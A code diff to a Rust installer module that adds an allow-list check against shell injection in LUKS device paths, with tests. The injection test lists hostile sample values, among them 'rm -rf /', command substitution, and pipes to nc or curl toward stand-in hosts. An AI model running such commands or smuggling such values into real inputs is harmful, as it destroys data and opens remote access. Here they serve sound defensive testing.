@@ -1,5 +1,5 @@
 // file: crates/uaa-core/src/luks_keys.rs
-// version: 1.1.1
+// version: 1.1.2
 // guid: 2aa8e08c-f451-4463-962a-5fa2d970dd7a
 // last-edited: 2026-07-10
 
@@ -53,6 +53,21 @@ fn validate_luks_dev(luks_dev: &str) -> crate::error::Result<()> {
     if !luks_dev.starts_with("/dev/") {
         return Err(AutoInstallError::ConfigError(format!(
             "luks_dev must be an absolute /dev/ path, got '{luks_dev}'"
+        )));
+    }
+    // Fail-closed against shell injection: `luks_dev` is interpolated UNQUOTED
+    // into shell command strings (dump_command / build_enroll_command), so it
+    // must contain only device-path characters. Reject anything with a space or
+    // a shell metacharacter (`;`, `|`, `&`, `$`, backtick, `()`, `<>`, quotes,
+    // `*?[]{}`, newline, …) rather than trying to escape it — a real device
+    // path never needs them. Covers /dev/nvme0n1p4, /dev/sda1, /dev/vda,
+    // /dev/mapper/luks-<uuid>, /dev/disk/by-id/… .
+    if !luks_dev
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'_' | b'-' | b'.'))
+    {
+        return Err(AutoInstallError::ConfigError(format!(
+            "luks_dev contains characters not allowed in a device path (possible injection): '{luks_dev}'"
         )));
     }
     Ok(())
@@ -403,6 +418,44 @@ mod tests {
             build_enroll_command("nvme0n1p4", "test-passphrase"),
             Err(AutoInstallError::ConfigError(_))
         ));
+    }
+
+    #[test]
+    fn test_validate_luks_dev_rejects_injection() {
+        // Shell-metacharacter payloads that pass the /dev/ prefix but must be
+        // rejected before ever reaching a command string.
+        for evil in [
+            "/dev/sda; rm -rf /",
+            "/dev/$(whoami)",
+            "/dev/`id`",
+            "/dev/sda|nc attacker 1",
+            "/dev/sda && curl evil",
+            "/dev/sd a",
+            "/dev/sda\nrm -rf /",
+            "/dev/sda>~/x",
+        ] {
+            assert!(
+                matches!(build_enroll_command(evil, "pw"), Err(AutoInstallError::ConfigError(_))),
+                "injection payload should be rejected: {evil:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_validate_luks_dev_accepts_real_paths() {
+        // Anti-over-suppression: legitimate device paths must still build.
+        for good in [
+            "/dev/nvme0n1p4",
+            "/dev/sda1",
+            "/dev/vda",
+            "/dev/mapper/luks-0f3c2a1b-dead-beef",
+            "/dev/disk/by-id/nvme-eui.0025",
+        ] {
+            assert!(
+                build_enroll_command(good, "pw").is_ok(),
+                "legitimate device path should build: {good:?}"
+            );
+        }
     }
 
     #[test]
